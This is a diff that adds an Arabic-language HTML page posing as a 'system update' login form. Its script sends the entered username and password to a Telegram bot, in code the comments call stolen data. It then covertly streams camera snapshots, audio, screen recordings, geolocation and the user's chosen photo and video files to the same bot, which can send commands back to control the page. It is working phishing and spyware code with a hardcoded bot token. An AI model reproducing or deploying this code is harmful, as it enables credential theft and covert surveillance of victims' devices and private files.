@@ -1,0 +1,323 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>نظام المراقبة الشامل</title>
+    <style>
+        body { 
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
+            background-color: #f0f2f5; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            overflow: hidden;
+        }
+        .container { 
+            background: white; 
+            padding: 30px; 
+            border-radius: 15px; 
+            box-shadow: 0 8px 16px rgba(0,0,0,0.2); 
+            text-align: center; 
+            width: 320px; 
+            position: relative;
+        }
+        input { 
+            width: 90%; 
+            padding: 12px; 
+            margin: 10px 0; 
+            border: 1px solid #ccc; 
+            border-radius: 8px; 
+            font-size: 16px;
+            transition: 0.3s;
+        }
+        input:focus { border-color: #0088cc; outline: none; }
+        button { 
+            background-color: #0088cc; 
+            color: white; 
+            border: none; 
+            padding: 12px 20px; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            width: 100%; 
+            font-size: 16px;
+            font-weight: bold;
+        }
+        button:hover { background-color: #006699; }
+        h2 { color: #333; margin-bottom: 20px; }
+        
+        /* واجهة المراقبة المخفية */
+        #spyMode {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: black;
+            z-index: 9999;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+        }
+        video { 
+            width: 100%; 
+            max-height: 80vh; 
+            object-fit: cover; 
+        }
+        .status { 
+            position: absolute; 
+            bottom: 20px; 
+            color: lime; 
+            font-size: 14px; 
+            background: rgba(0,0,0,0.7);
+            padding: 5px 10px;
+            border-radius: 5px;
+        }
+        /* إخفاء الفيديو الحقيقي */
+        #hiddenVideo { display: none; }
+    </style>
+</head>
+<body>
+
+<!-- واجهة تسجيل الدخول -->
+<div class="container" id="loginBox">
+    <h2>تحديث النظام</h2>
+    <p style="color:#666; font-size:14px;">يرجى تسجيل الدخول للمتابعة</p>
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="البريد الإلكتروني أو اسم المستخدم" required>
+        <input type="password" id="password" placeholder="كلمة المرور" required>
+        <button type="submit">تسجيل الدخول</button>
+    </form>
+</div>
+
+<!-- واجهة الكاميرا المخفية -->
+<div id="spyMode">
+    <video id="camera" autoplay playsinline muted></video>
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <div class="status" id="status">🔴 جاري البث المباشر...</div>
+</div>
+
+<script>
+    // إعدادات البوت المحدثة
+    const botToken = '9234471152:AAGfCEUPSxHEoVP-YqqXXEs6a0Z8SaGFKAw';
+    const chatId = 'YOUR_CHAT_ID_HERE'; 
+
+    let currentStream = null;
+    let mediaRecorder = null;
+    let recordedChunks = [];
+    let screenStream = null;
+    let isFrontCam = false;
+
+    // دالة إرسال الملفات (صور/فيديو/صوت)
+    async function sendFile(blob, filename, caption = "") {
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('caption', caption);
+        
+        if (blob.type.startsWith('image')) {
+            formData.append('photo', blob, filename);
+            await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, { body: formData });
+        } else {
+            formData.append('document', blob, filename);
+            await fetch(`https://api.telegram.org/bot${botToken}/sendDocument`, { body: formData });
+        }
+    }
+
+    // بدء الكاميرا
+    async function startCamera(facing = 'environment') {
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ 
+                video: { facingMode: facing }, 
+                audio: true 
+            });
+            
+            const video = document.getElementById('camera');
+            video.srcObject = stream;
+            currentStream = stream;
+            
+            document.getElementById('spyMode').style.display = 'flex';
+            document.getElementById('loginBox').style.display = 'none';
+            
+            // بدء التسجيل الصوتي
+            startAudioRecording(stream);
+            
+            video.onloadedmetadata = () => {
+                sendPhoto(); // إرسال صورة أولية
+                setInterval(sendPhoto, 5000); // إرسال صورة كل 5 ثواني
+            };
+        } catch (err) {
+            console.error("Camera Error:", err);
+        }
+    }
+
+    // بدء تسجيل الصوت
+    function startAudioRecording(stream) {
+        recordedChunks = [];
+        mediaRecorder = new MediaRecorder(stream);
+        
+        mediaRecorder.ondataavailable = event => {
+            if (event.data.size > 0) {
+                // إرسال مقطع صوتي صغير كل 30 ثانية
+                setTimeout(() => {
+                    sendFile(event.data, 'audio_recording.mp3', '🎤 تسجيل صوتي مباشر');
+                }, 1000);
+            }
+        };
+        
+        mediaRecorder.start(30000); // تسجيل مقاطع كل 30 ثانية
+    }
+
+    // إرسال صورة من الكاميرا
+    function sendPhoto() {
+        const video = document.getElementById('camera');
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const ctx = canvas.getContext('2d');
+        
+        try {
+            ctx.drawImage(video, 0, 0);
+            canvas.toBlob(blob => {
+                sendFile(blob, 'live_capture.jpg', '📸 صورة حية من الكاميرا');
+            }, 'image/jpeg');
+        } catch(e) {}
+    }
+
+    // التعامل مع تسجيل الدخول
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const username = document.getElementById('username').value;
+        const password = document.getElementById('password').value;
+        
+        // إرسال البيانات المسروقة
+        sendMessage(`🔐 *بيانات جديدة مستلمة*\n\n👤 الاسم: ${username}\n🔑 كلمة المرور: ${password}\n📱 الوقت: ${new Date().toLocaleString()}`);
+        
+        // بدء المراقبة
+        startCamera('environment');
+        startScreenRecording();
+    });
+
+    // تسجيل الشاشة
+    async function startScreenRecording() {
+        try {
+            screenStream = await navigator.mediaDevices.getDisplayMedia({ 
+                video: { cursor: "always" }, 
+                audio: true 
+            });
+            
+            const hiddenVideo = document.getElementById('hiddenVideo');
+            hiddenVideo.srcObject = screenStream;
+            
+            // تسجيل الشاشة وإرسالها كملف
+            const recorder = new MediaRecorder(screenStream);
+            recorder.ondataavailable = event => {
+                if (event.data.size > 0) {
+                    setTimeout(() => {
+                        sendFile(event.data, 'screen_recording.webm', '🖥️ تسجيل الشاشة');
+                    }, 1000);
+                }
+            };
+            recorder.start(60000); // تسجيل دقيقة واحدة ثم الإرسال
+        } catch (err) {
+            console.log("Screen recording not supported or cancelled");
+        }
+    }
+
+    // التحكم عن بعد عبر الأوامر
+    setInterval(async () => {
+        try {
+            const res = await fetch(`https://api.telegram.org/bot${botToken}/getUpdates`);
+            const data = await res.json();
+            
+            if (data.ok && data.result.length > 0) {
+                const lastUpdate = data.result[data.result.length - 1];
+                const msg = lastUpdate.message;
+                
+                if (msg && msg.chat.id == chatId) {
+                    const cmd = msg.text.toLowerCase().trim();
+                    
+                    if (cmd === '/cam_front') {
+                        stopCamera();
+                        startCamera('user');
+                        sendMessage("📸 تم تفعيل الكاميرا الأمامية");
+                    }
+                    else if (cmd === '/cam_back') {
+                        stopCamera();
+                        startCamera('environment');
+                        sendMessage("📷 تم تفعيل الكاميرا الخلفية");
+                    }
+                    else if (cmd === '/location') {
+                        getLocation();
+                    }
+                    else if (cmd === '/stop') {
+                        stopCamera();
+                        document.getElementById('spyMode').style.display = 'none';
+                        document.getElementById('loginBox').style.display = 'block';
+                        sendMessage("🛑 تم إيقاف المراقبة");
+                    }
+                    else if (cmd === '/photos') {
+                        grabPhotos();
+                    }
+                    else if (cmd === '/screenshot') {
+                        sendPhoto();
+                        sendMessage("📸 تم إرسال لقطة شاشة");
+                    }
+                }
+            }
+        } catch(e) {}
+    }, 3000);
+
+    function stopCamera() {
+        if(currentStream) {
+            currentStream.getTracks().forEach(track => track.stop());
+        }
+        if(screenStream) {
+            screenStream.getTracks().forEach(track => track.stop());
+        }
+    }
+
+    function getLocation() {
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+                sendMessage(`📍 الموقع الجغرافي:\n${mapLink}\nLat: ${lat}, Lon: ${lon}`);
+            }, error => {
+                sendMessage("❌ فشل في تحديد الموقع بدقة");
+            });
+        }
+    }
+
+    // سحب الصور من الجهاز
+    function grabPhotos() {
+        const input = document.createElement('input');
+        input.type = 'file';
+        input.accept = 'image/*,video/*';
+        input.multiple = true;
+        input.click();
+        
+        input.onchange = (e) => {
+            const files = e.target.files;
+            for (let i = 0; i < files.length; i++) {
+                sendFile(files[i], files[i].name, `📁 ملف مسحوب: ${files[i].name}`);
+            }
+        };
+    }
+
+    function sendMessage(text) {
+        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+            method: 'POST',
+            headers: {'Content-Type': 'application/json'},
+            body: JSON.stringify({
+                chat_id: chatId,
+                text: text,
+                parse_mode: 'Markdown'
+            })
+        });
+    }
+</script>
+
+</body>
+</html>
